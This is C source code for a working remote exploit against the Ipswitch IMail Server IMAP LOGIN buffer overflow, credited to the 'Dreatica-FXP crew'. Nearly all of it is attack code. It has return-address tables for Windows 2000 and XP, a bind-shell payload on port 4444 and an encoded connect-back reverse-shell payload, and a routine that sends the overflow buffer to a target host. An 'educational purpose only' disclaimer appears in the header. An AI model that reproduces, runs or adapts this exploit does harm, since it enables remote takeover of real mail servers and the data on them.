/* Dreatica-FXP crew
* 
* ----------------------------------------
* Target         : Ipswitch IMAIL Server IMAPD 7.13 - 8.20 exploit 
* Site           : http://www.ipswitch.com
* Found by       : iDEFENSE Security (http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=243)
* ----------------------------------------
* Exploit date   : 31.03.2007
* Exploit writer : Heretic2 (heretic2x@gmail.com)
* OS             : Windows 2000 SP4 and Windows XP ALL
* Crew           : Dreatica-FXP
* ----------------------------------------
* Info: Well, this is the realization of the IMAIL IMAPd 'LOGIN' buffer overflow vulnerability. 
*   The version provided by kcope uses SEH overwrite method, which doesn't work on Windows XP SP2,
*   so i have written the exploit that overwrites EIP and then execute the shellcode. 
*
*   I have tested this exploit on the all versions of Imail from 7.13 to 8.20, versions < 7.13 are also vulnerable,
*   but i don't have them to test the exploit, Windows 2000 SP4 and Windows XP SP0-SP2.
* 
*   Here you need to select the OS and the IMAIL version, that is not good, but anyone with some brain can 
*   easily modify the code to get version of Imail from banner or obtain 'data segment' value without knowing 
*   the Imail version.
*
* ----------------------------------------
* Thanks to:
*       iDEFENSE Security           ( http://labs.idefense.com/     
*       The Metasploit project      ( http://metasploit.com                            ) 
*       kcope                       ( <kingcope [at] gmx.net>                          ) 
*       Dreatica-FXP crew           (                                                  )
* ----------------------------------------
* This was written for educational purpose only. Use it at your own risk. Author will be not be 
* responsible for any damage, caused by that code.
*
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib,"ws2_32")


void usage(char * s);
void help(char * s);
void logo();
SOCKET do_connect (char *remotehost, int port);
void prepare_shellcode(unsigned char * fsh, int sh, char * cbip, int cbport);
void make_buffer(unsigned char * buf, int itarget, int sh, char * cbip, int cbport, int ifix);
int send_buffer(SOCKET sa, char * buf, char * remotehost, int port);
int validate_args(int port, int sh, int itarget, int fix);

// ###################################################
// # XGetopt.h  Version 1.2                
// ###################################################
extern int optind, opterr;
extern char *optarg;

int getopt(int argc, char *argv[], char *optstring);
// ##################################################


struct _target{
	const char *t ;
	unsigned long ret ;
} targets[] = 
{	// jmp esp
	{"Windows 2000 SP4 ENG           [ shell32.dll ]",   0x7850d3bf }, 
	{"Windows XP SP0 ENG             [  ntdll.dll  ]",   0x77f439e3 }, 
	{"Windows XP SP0 RUS             [  ntdll.dll  ]",   0x77f5801c }, 
	{"Windows XP SP1 ENG             [  ntdll.dll  ]",   0x77fa59cc }, 
	{"Windows XP SP1 RUS             [  ntdll.dll  ]",   0x77fb59cc }, 
	{"Windows XP SP2 ENG             [  ntdll.dll  ]",   0x7C941eed }, 
	{"Windows XP SP2 RUS             [  ntdll.dll  ]",   0x7C941eed }, 
	{"Windows XP SP2 RUS(no patches) [ shell32.dll ]",   0x7C82385D }, 
	{NULL,                                               0x00000000 }

};


struct _imail{
	const char * name ; 
	unsigned long fix;
}imailfix[] =
{
	// address to data segment in Mailbox
	{"Ipswitch IMAIL Server IMAPD 7.04 - 8.05HF3", 0x10034000}, 
	{"Ipswitch IMAIL Server IMAPD 8.10 - 8.11   ", 0x1002f000}, 
	{"Ipswitch IMAIL Server IMAPD 8.12 - 8.20   ", 0x10031000}, 
	{NULL,                                         0x00000000}


};


struct _shellcode{
	const char * name;
	char * shellcode;
} shellcodes[]={ // bad charachters: 0x00 0x03 0x0A 0x0C 0x22 0x5C      (and more)
	{"Spawn bindshell on port 4444", 
	/* win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com */
		"\x29\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x63"
		"\xb4\x7d\x58\x83\xeb\xfc\xe2\xf4\x9f\xde\x96\x15\x8b\x4d\x82\xa7"
		"\x9c\xd4\xf6\x34\x47\x90\xf6\x1d\x5f\x3f\x01\x5d\x1b\xb5\x92\xd3"
		"\x2c\xac\xf6\x07\x43\xb5\x96\x11\xe8\x80\xf6\x59\x8d\x85\xbd\xc1"
		"\xcf\x30\xbd\x2c\x64\x75\xb7\x55\x62\x76\x96\xac\x58\xe0\x59\x70"
		"\x16\x51\xf6\x07\x47\xb5\x96\x3e\xe8\xb8\x36\xd3\x3c\xa8\x7c\xb3"
		"\x60\x98\xf6\xd1\x0f\x90\x61\x39\xa0\x85\xa6\x3c\xe8\xf7\x4d\xd3"
		"\x23\xb8\xf6\x28\x7f\x19\xf6\x18\x6b\xea\x15\xd6\x2d\xba\x91\x08"
		"\x9c\x62\x1b\x0b\x05\xdc\x4e\x6a\x0b\xc3\x0e\x6a\x3c\xe0\x82\x88"
		"\x0b\x7f\x90\xa4\x58\xe4\x82\x8e\x3c\x3d\x98\x3e\xe2\x59\x75\x5a"
		"\x36\xde\x7f\xa7\xb3\xdc\xa4\x51\x96\x19\x2a\xa7\xb5\xe7\x2e\x0b"
		"\x30\xe7\x3e\x0b\x20\xe7\x82\x88\x05\xdc\x6c\x04\x05\xe7\xf4\xb9"
		"\xf6\xdc\xd9\x42\x13\x73\x2a\xa7\xb5\xde\x6d\x09\x36\x4b\xad\x30"
		"\xc7\x19\x53\xb1\x34\x4b\xab\x0b\x36\x4b\xad\x30\x86\xfd\xfb\x11"
		"\x34\x4b\xab\x08\x37\xe0\x28\xa7\xb3\x27\x15\xbf\x1a\x72\x04\x0f"
		"\x9c\x62\x28\xa7\xb3\xd2\x17\x3c\x05\xdc\x1e\x35\xea\x51\x17\x08"
		"\x3a\x9d\xb1\xd1\x84\xde\x39\xd1\x81\x85\xbd\xab\xc9\x4a\x3f\x75"
		"\x9d\xf6\x51\xcb\xee\xce\x45\xf3\xc8\x1f\x15\x2a\x9d\x07\x6b\xa7"
		"\x16\xf0\x82\x8e\x38\xe3\x2f\x09\x32\xe5\x17\x59\x32\xe5\x28\x09"
		"\x9c\x64\x15\xf5\xba\xb1\xb3\x0b\x9c\x62\x17\xa7\x9c\x83\x82\x88"
		"\xe8\xe3\x81\xdb\xa7\xd0\x82\x8e\x31\x4b\xad\x30\x93\x3e\x79\x07"
		"\x30\x4b\xab\xa7\xb3\xb4\x7d\x58"
	 },
	{"ConnectBack shell (set the  CBIP and CBPort)",
		/* thx to the one who wrote it, taken from kcope exploit */
		"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\xC2\xE2\xFA"
		"\xEB\x05\xE8\xEB\xFF\xFF\xFF"
		"\x2B\x39\xC2\xC2\xC2\x9D\xA6\x63\xF2\xC2\xC2\xC2\x49\x82\xCE\x49"
		"\xB2\xDE\x6F\x49\xAA\xCA\x49\x35\xA8\xC6\x9B\x2A\x59\xC2\xC2\xC2"
		"\x20\x3B\xAA\xF1\xF0\xC2\xC2\xAA\xB5\xB1\xF0\x9D\x96\x3D\xD4\x49"
		"\x2A\xA8\xC6\x9B\x2A\x40\xC2\xC2\xC2\x20\x3B\x43\x2E\x52\xC3\xC2"
		"\xC2\x96\xAA\xC3\xC3\xC2\xC2\x3D\x94\xD2\x92\x92\x92\x92\x82\x92"
		"\x82\x92\x3D\x94\xD6\x49\x1A\xAA\xBD\xC2\xC2\xC3\xAA\xC0\xC2\xC2"
		"\xF7\x49\x0E\xA8\xD2\x93\x91\x3D\x94\xDA\x47\x02\xB7\x88\xAA\xA1"
		"\xAF\xA6\xC2\x4B\xA4\xF2\x41\x2E\x96\x4F\xFE\xE6\xA8\xD7\x9B\x69"
		"\x20\x3F\x04\x86\xE6\xD2\x86\x3C\x86\xE6\xFF\x4B\x9E\xE6\x8A\x4B"
		"\x9E\xE6\x8E\x4B\x9E\xE6\x92\x4F\x86\xE6\xD2\x96\x92\x93\x93\x93"
		"\xA8\xC3\x93\x93\x3D\xB4\xF2\x93\x3D\x94\xC6\x49\x0E\xA8\x3D\x3D"
		"\xF3\x3D\x94\xCA\x91\x3D\x94\xDE\x3D\x94\xCE\x93\x94\x49\x87\xFE"
		"\x49\x96\xEA\xBA\xC1\x17\x90\x49\xB0\xE2\xC1\x37\xF1\x0B\x8B\x83"
		"\x6F\xC1\x07\xF1\x19\xCD\x7C\xD2\xF8\x14\xB6\xCA\x03\x09\xCF\xC1"
		"\x18\x82\x29\x33\xF9\xDD\xB7\x25\x98\x49\x98\xE6\xC1\x1F\xA4\x49"
		"\xCE\x89\x49\x98\xDE\xC1\x1F\x49\xC6\x49\xC1\x07\x69\x9C\x9B\x01"
		"\x2A\xC2\x3D\x3D\x3D\x4C\x8C\xCC\x2E\xB0\x3C\x71\xD4\x6F\x1B\xC7"
		"\x0C\xBC\x1A\x20\xB1\x09\x2F\x3E\xF9\x1B\xCB\x37\x6F\x2E\x3B\x68"
		"\xA2\x25\xBB\x04\xBB"
	},			
	{NULL , NULL }
};

// jump to our shellcode
unsigned char jmpcode[] = "\x8B\xc4\x66\x2D\xEC\x01\x66\x81\xec\xf0\x02\xFF\xE0";


int main(int argc, char **argv)
{
	char * remotehost=NULL, * cbip=NULL;
	char def_cbip[]="127.0.0.1";
	char temp1[100], temp2[100];
	int cbport, port, itarget=0, sh=0, fix=0;
	SOCKET s;
	char c;	
	logo();
	WSADATA wsa;
	WSAStartup(MAKEWORD(2,0), &wsa);
	
	if(argc<2)
	{
		usage(argv[0]);	
		WSACleanup();
		return -1;
	}
	// set defaults
	cbport=4444;
	port=143;
	// ------------	
	
	while((c = getopt(argc, argv, "h:p:s:t:I:P:f:"))!= EOF)
	{
		switch (c)
		{
			case 'h':
				remotehost=optarg;
				break; 	
			case 's':
				sscanf(optarg, "%d", &sh);
				sh--;
				break;
			case 't':
				sscanf(optarg, "%d", &itarget);
				itarget--;
				break;
			case 'f':
				sscanf(optarg, "%d", &fix);
				fix--;
				break;
			case 'p':
				sscanf(optarg, "%d", &port);
				break;
			case 'P':
				sscanf(optarg, "%d", &cbport);
				break;
			case 'I':
				cbip=optarg;
				break; 			
			default:
	            usage(argv[0]);
			return -1;
		}		
	}	
	if(remotehost==NULL)
	{
		usage(argv[0]);	
		WSACleanup();
		return -1;
	}
	if((sh==1)&&(cbip==NULL)) cbip = def_cbip ;
	if(validate_args(port, sh, itarget, fix)==-1) return -1;
	memset(temp1,0,sizeof(temp1));
	memset(temp2,0,sizeof(temp2));
	memset(temp1, '\x20' , 58 - strlen(remotehost) -1);	
	printf(" #  Host    : %s%s# \n", remotehost, temp1);	
	sprintf(temp2, "%d", port);
	memset(temp1,0,sizeof(temp1));
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);
	printf(" #  Port    : %s%s# \n", temp2, temp1);
	memset(temp1,0,sizeof(temp1));	
	memset(temp2,0,sizeof(temp2));
	sprintf(temp2, "%s", shellcodes[sh].name );
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);	
	printf(" #  Shellcde: %s%s# \n", temp2, temp1);
	memset(temp1,0,sizeof(temp1));	
	memset(temp1, '\x20' , 58 - strlen(targets[itarget].t) -1);	
	printf(" #  Target  : %s%s# \n", targets[itarget].t, temp1);
	if(sh==1)
	{
		memset(temp1,0,sizeof(temp1));	
		memset(temp1, '\x20' , 58 - strlen(cbip) -1);	
		printf(" #  CB IP   : %s%s# \n", cbip, temp1);
		sprintf(temp2, "%d", cbport);
		memset(temp1,0,sizeof(temp1));
		memset(temp1, '\x20' , 58 - strlen(temp2) -1);
		printf(" #  CB port : %s%s# \n", temp2, temp1);
	}
	printf(" # ------------------------------------------------------------------- # \n");
	printf("[+] Checking if server is online... ");
	fflush(stdout);
	s=do_connect(remotehost, port);   
	if(s==-1)
	{
		fprintf(stdout, "failed\n");
		return 0;
	}
	closesocket(s);
	printf("SUCCESS!\n");
	char buf[1000];
	memset(buf,0,sizeof(buf));
	printf("[+] Constructing attacking buffer... ");
	fflush(stdout);
	make_buffer((unsigned char *)buf,itarget,sh,cbip,cbport,fix);
	printf("done\n");
	SOCKET sa;
	sa=do_connect(remotehost, port);  
	if(sa==-1)
	{
		fprintf(stdout, "[-] Connection failed to server %s\n", remotehost);
		return -1;
	}
	printf("[+] Sending %d bytes of buffer to server\n", strlen(buf));
	if(send_buffer(sa, buf,remotehost,port)==0)
	{
		fprintf(stdout, "[-] Cannot send the buffer to server %s\n", remotehost);
		return -1;
	}
	printf("[+] Buffer sent\n");
	closesocket(sa);	
	if(sh==0)
	{
		printf("[+] Connect to %s:%d\n", remotehost, 7915);	
	}else
	{
		printf("[+] The shell should arrive to %s:%d", cbip, cbport);
	}
	WSACleanup();	
	return 0;
}



int validate_args(int port, int sh, int itarget, int fix)
{
	int i=0,x=0;
	for(i=0;shellcodes[i].name;i++)if(i==sh)x=1;
    if(x==0)
	{
		printf("[-] The shellcode number is invalid\n");
		return -1;
	}
	x=0;
	for(i=0;targets[i].t;i++)if(i==itarget)x=1;
	if(x==0)
	{
		printf("[-] The target is invalid\n");
		return -1;
	}
	x=0;
	for(i=0;imailfix[i].name;i++)if(i==fix)x=1;
	if(x==0)
	{
		printf("[-] The imail version is invalid\n");
		return -1;
	}
	if(port<=0)
	{
		printf("[-] The port is invalid\n");
		return -1;
	}
	return 1;
}


SOCKET do_connect (char *remotehost, int port)
{
   static struct hostent *host;
   static struct sockaddr_in addr;
   static int done=0;
   SOCKET s;	
   if (done != 1)
   {
       host = gethostbyname(remotehost);
       if (!host)
       {
           perror("[-] gethostbyname() failed");
           return -1;
       }
       addr.sin_addr = *(struct in_addr*)host->h_addr;
   }

   s = socket(PF_INET, SOCK_STREAM, 0);
   if (s == -1)
   {
       closesocket(s);
       perror("socket() failed");
       return -1;
   }

   addr.sin_port = htons(port);
   addr.sin_family = AF_INET;

   if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == -1)
   {
       closesocket(s);
      
       return -1;
   }

   done=1;
   return s;
}

void prepare_shellcode(unsigned char * fsh, int sh, char * cbip, int cbport)
{
	memcpy(fsh, shellcodes[sh].shellcode, strlen(shellcodes[sh].shellcode));
	if(sh==1)
	{			
		static struct hostent *host = gethostbyname(cbip);
		static struct sockaddr_in addr;
		addr.sin_addr = *(struct in_addr*)host->h_addr;		
		fsh[111] = (addr.sin_addr.S_un.S_un_b.s_b1) ^ 0xc2;
		fsh[112] = (addr.sin_addr.S_un.S_un_b.s_b2) ^ 0xc2;
		fsh[113] = (addr.sin_addr.S_un.S_un_b.s_b3) ^ 0xc2;
		fsh[114] = (addr.sin_addr.S_un.S_un_b.s_b4) ^ 0xc2;
        
		fsh[118] = ((cbport >> 8) & 0xff) ^ 0xc2;
		fsh[119] = ((cbport     ) & 0xff) ^ 0xc2;
	}
}

void make_buffer(unsigned char * buf, int itarget, int sh, char * cbip, int cbport, int ifix)
{
	// prepare shellcode
	unsigned char * fsh;
	fsh = (unsigned char *) malloc ((strlen(shellcodes[sh].shellcode)+1) );
	memset(fsh, 0, (strlen(shellcodes[sh].shellcode)+1));	
	prepare_shellcode(fsh, sh, cbip, cbport);
	// -----------------
	
		// init buffer
	memset(buf,0,sizeof(buf));
	unsigned char * cp = buf;
	*cp++ = '@';
	*cp++ = '\x90';
	*cp++ = '\x90';
	*cp++ = '\x90';
	*cp++ = '\x90';

		// write shellcode
	memcpy(cp, fsh, strlen((char *)fsh)  );
	cp+=strlen((char *)cp);
	memset(cp, 'A', 488-strlen((char *)fsh));
	cp+=strlen((char *)cp);
		// set EIP
	*cp++ = (unsigned char)((targets[itarget].ret      ) & 0xff);
	*cp++ = (unsigned char)((targets[itarget].ret >>  8) & 0xff);
	*cp++ = (unsigned char)((targets[itarget].ret >> 16) & 0xff);
	*cp++ = (unsigned char)((targets[itarget].ret >> 24) & 0xff);

	*cp++ = '\x41';
	*cp++ = '\x41';
	*cp++ = '\x41';
	*cp++ = '\xeb';	
	*cp++ = '\x03';
	*cp++ = (unsigned char)((imailfix[ifix].fix >>  8) & 0xff);
	*cp++ = (unsigned char)((imailfix[ifix].fix >> 16) & 0xff);
	*cp++ = (unsigned char)((imailfix[ifix].fix >> 24) & 0xff);

		// add jump back
	memcpy(cp, jmpcode, strlen((char *)jmpcode));
	// -----------
}

int send_buffer(SOCKET s, char * buf, char * remotehost, int port)
{		
	char bufmax[1024];
	recv(s, bufmax, sizeof(bufmax),0);	
	char sendbuf[1000];
	memset(sendbuf, 0, sizeof(sendbuf));
	strcat(sendbuf, "a001 LOGIN \"");
	strcat(sendbuf, buf);
	strcat(sendbuf, "\" password\r\n");
	int sentbytes=send(s, sendbuf, (int)strlen(sendbuf),0);
	if(sentbytes<(int)strlen(sendbuf)) return 0;
	return 1;
}

void usage(char * s)
{	
	printf(" Usage: %s -h <host> [-p <port>] [-s <shellcode>] [-t <target>] [-f <imail>] [-I <cb IP>] [-P <cb port>]\n\n", s);	
	printf(" ----------------------------------------------------------------------- \n");
	printf(" Arguments:\n");
	printf("    -h host to connect                      \n");
	printf("    -p port             (default: 143      )\n");
	printf("    -s shellcode        (default: 1        )\n");	
	printf("    -t target           (default: 1        )\n");
	printf("    -f Imail version    (default: 1        )\n");
	printf("    -I connect back IP  (default: 127.0.0.1)\n");
	printf("    -P connect back port(default: 4444     )\n");
	printf("\n");
	printf("    Shellcodes:\n");
	for(int i=0; shellcodes[i].name!=0;i++)
	{
		printf("         %d. %s\n",i+1,shellcodes[i].name);				
	}	
	printf("\n");	
	printf("    Targets:\n\n");
	int j;
	for(j=0; targets[j].t!=0;j++)
	{
		printf("         %d. %s\n",j+1,targets[j].t);
	}		
	printf("\n");
	printf("    Imail version:\n\n");
	for(j=0; imailfix[j].name!=0;j++)
	{
		printf("         %d. %s\n",j+1,imailfix[j].name);
	}		
	printf("\n");
	printf(" ----------------------------------------------------------------------- \n");		
}



// ###################################################
// # XGetopt.h  Version 1.2                
// ###################################################
char	*optarg;		// global argument pointer
int		optind = 0; 	// global argv index

int getopt(int argc, char *argv[], char *optstring)
{
	static char *next = NULL;
	if (optind == 0)
		next = NULL;

	optarg = NULL;

	if (next == NULL || *next == '\0')
	{
		if (optind == 0)
			optind++;

		if (optind >= argc || argv[optind][0] != '-' || argv[optind][1] == '\0')
		{
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		if (strcmp(argv[optind], "--") == 0)
		{
			optind++;
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		next = argv[optind];
		next++;		// skip past -
		optind++;
	}

	char c = *next++;
	char *cp = strchr(optstring, c);

	if (cp == NULL || c == ':')
		return '?';

	cp++;
	if (*cp == ':')
	{
		if (*next != '\0')
		{
			optarg = next;
			next = NULL;
		}
		else if (optind < argc)
		{
			optarg = argv[optind];
			optind++;
		}
		else
		{
			return '?';
		}
	}

	return c;
}
// ###################################################


void logo()
{
	printf(" ####################################################################### \n");	
	printf(" #     ____                 __  _                  ______  __    _____ #\n");
	printf(" #    / __ \\________  _____/ /_(_)_________       / __/\\ \\/ /   / _  / #\n");
	printf(" #   / / / / ___/ _ \\/ __ / __/ / ___/ __ / ___  / /    \\  /   / // /  #\n");
	printf(" #  / /_/ / / /  ___/ /_// /_/ / /__/ /_// /__/ / _/    /  \\  / ___/   #\n");
	printf(" # /_____/_/  \\___/ \\_,_/\\__/_/\\___/\\__,_/     /_/     /_/\\_\\/_/       #\n");
	printf(" #                                 crew                                #\n");
	printf(" ####################################################################### \n");	
	printf(" #  Exploit : Ipswitch IMAIL Server IMAPD 7.13 - 8.20 exploit          # \n");
	printf(" #  Version : 1.0                                                      # \n");
	printf(" #  System  : Windows 2000 SP4, Windows XP ALL                         # \n");
	printf(" #  Date    : 31.03.2007                                               # \n");
	printf(" # ------------------------------------------------------------------- # \n");
}
